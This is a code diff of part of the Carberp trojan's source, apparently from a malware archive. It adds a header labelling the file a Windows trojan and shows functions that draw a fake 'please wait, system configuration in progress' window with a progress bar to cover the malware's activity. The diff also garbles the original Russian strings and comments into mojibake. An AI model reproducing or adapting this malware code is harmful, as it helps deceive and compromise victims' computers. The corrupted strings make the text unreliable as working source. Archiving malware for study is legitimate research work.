@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 // dllmain.cpp : Defines the entry point for the DLL application.
 #include "stdafx.h"
 #include "windows.h"
@@ -45,7 +56,7 @@ static DWORD WINAPI FakeWindow( LPVOID p )
       return 0;  
  
 	HWND warnWnd = (HWND)CreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, xPB, yPB - 16, wPB, 16, fakeWindow, 0, inst, 0 );
-	HWND warnText = (HWND)CreateWindowExA( 0, STATUSCLASSNAME, "Подождите, идет настройка системы ...", WS_VISIBLE | WS_CHILD | SBT_NOBORDERS, 0, 0, 0, 0, warnWnd, 0, inst, 0 );
+	HWND warnText = (HWND)CreateWindowExA( 0, STATUSCLASSNAME, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ ...", WS_VISIBLE | WS_CHILD | SBT_NOBORDERS, 0, 0, 0, 0, warnWnd, 0, inst, 0 );
 	HWND warnWnd2 = (HWND)CreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, wPB - 16, 0, 16, 16, warnWnd, 0, inst, 0 );
 	HWND progressBar = (HWND)CreateWindowExA( 0, PROGRESS_CLASS, 0, WS_CHILD | WS_VISIBLE, xPB, yPB, wPB, hPB, fakeWindow, 0, inst, 0 );
 	HFONT font = (HFONT)SendMessageA( parent, WM_GETFONT, 0, 0 );
@@ -102,7 +113,7 @@ static BOOL CALLBACK EnumTopWindows( HWND wnd, LPARAM lParam )
 	if( pid == GetCurrentProcessId() )
 	{
 		*((HWND*)lParam) = wnd;
-		return FALSE; //останавливаем поиск
+		return FALSE; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	}
 	return TRUE;
 }
